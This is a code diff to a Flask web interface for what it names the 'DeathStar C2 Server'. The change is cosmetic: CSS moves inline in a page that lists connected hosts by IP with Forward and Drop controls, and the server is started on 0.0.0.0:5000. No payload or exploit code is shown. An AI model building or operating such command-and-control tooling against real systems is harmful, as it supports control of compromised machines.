@@ -16,81 +16,6 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <title>DeathStar C2 Server</title>
-    <style>
-        body {
-            background-color: #000;
-            color: #fff;
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-        }
-        .title-bar {
-            background-color: #333;
-            color: #fff;
-            text-align: center;
-            padding: 10px;
-            position: fixed;
-            width: 100%;
-            top: 0;
-            left: 0;
-            z-index: 1000;
-        }
-        .content {
-            margin-top: 60px; /* To avoid overlap with the fixed title bar */
-            padding: 20px;
-        }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            background-color: #222;
-            color: #ddd;
-        }
-        th, td {
-            padding: 10px;
-            border: 1px solid #444;
-            text-align: left;
-        }
-        th {
-            background-color: #555;
-        }
-        tr:nth-child(even) {
-            background-color: #333;
-        }
-        tr:hover {
-            background-color: #444;
-        }
-        form {
-            display: inline;
-        }
-        .drop-button {
-            background-color: #dc3545; /* Red background for the drop button */
-            color: white;
-            border: none;
-            padding: 5px 10px;
-            cursor: pointer;
-        }
-        .drop-button:hover {
-            background-color: #c82333;
-        }
-        .send-command-container {
-            display: inline-flex;
-            flex-direction: column;
-            align-items: flex-end;
-        }
-        input[type="text"], input[type="submit"] {
-            margin-bottom: 5px;
-        }
-        input[type="submit"] {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 5px 10px;
-            cursor: pointer;
-        }
-        input[type="submit"]:hover {
-            background-color: #0056b3;
-        }
-    </style>
     <script>
         function sendRequest(url, data, successMessage) {
             var xhr = new XMLHttpRequest();
@@ -135,33 +60,33 @@ HTML_TEMPLATE = """
         });
     </script>
 </head>
-<body>
-    <div class="title-bar">
+<body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 0;">
+    <div style="background-color: #333; color: #fff; text-align: center; padding: 10px; position: fixed; width: 100%; top: 0; left: 0; z-index: 1000;">
         DeathStar
     </div>
-    <div class="content">
+    <div style="margin-top: 60px; padding: 20px;">
         <h1>Connections</h1>
-        <table>
+        <table style="width: 100%; border-collapse: collapse; background-color: #222; color: #ddd;">
             <tr>
-                <th>ID</th>
-                <th>IP Address</th>
-                <th>Actions</th>
+                <th style="padding: 10px; border: 1px solid #444; background-color: #555;">ID</th>
+                <th style="padding: 10px; border: 1px solid #444; background-color: #555;">IP Address</th>
+                <th style="padding: 10px; border: 1px solid #444; background-color: #555;">Actions</th>
             </tr>
             {% for id, (conn, addr) in connections.items() %}
             <tr>
-                <td>{{ id }}</td>
-                <td>{{ addr[0] }}</td>
-                <td class="actions">
-                    <div class="send-command-container">
-                        <form action="/forward" method="post">
+                <td style="padding: 10px; border: 1px solid #444; text-align: left;">{{ id }}</td>
+                <td style="padding: 10px; border: 1px solid #444; text-align: left;">{{ addr[0] }}</td>
+                <td class="actions" style="padding: 10px; border: 1px solid #444; text-align: left;">
+                    <div style="display: inline-flex; flex-direction: column; align-items: flex-end;">
+                        <form action="/forward" method="post" style="display: inline;">
                             <input type="hidden" name="id" value="{{ id }}">
-                            <input type="text" name="forward_ip" placeholder="Forward IP" required>
-                            <input type="submit" value="Forward">
+                            <input type="text" name="forward_ip" placeholder="Forward IP" required style="margin-bottom: 5px;">
+                            <input type="submit" value="Forward" style="background-color: #007bff; color: white; border: none; padding: 5px 10px; cursor: pointer; margin-bottom: 5px;">
                         </form>
                     </div>
-                    <form action="/drop" method="post">
+                    <form action="/drop" method="post" style="display: inline;">
                         <input type="hidden" name="id" value="{{ id }}">
-                        <input type="submit" class="drop-button" value="Drop">
+                        <input type="submit" value="Drop" style="background-color: #dc3545; color: white; border: none; padding: 5px 10px; cursor: pointer;">
                     </form>
                 </td>
             </tr>
@@ -170,6 +95,7 @@ HTML_TEMPLATE = """
     </div>
 </body>
 </html>
+        
 """
 
 # Route to display the web interface
@@ -251,3 +177,4 @@ def start_c2_server():
 if __name__ == '__main__':
     threading.Thread(target=start_c2_server, daemon=True).start()
     app.run(host='0.0.0.0', port=5000)
+                            
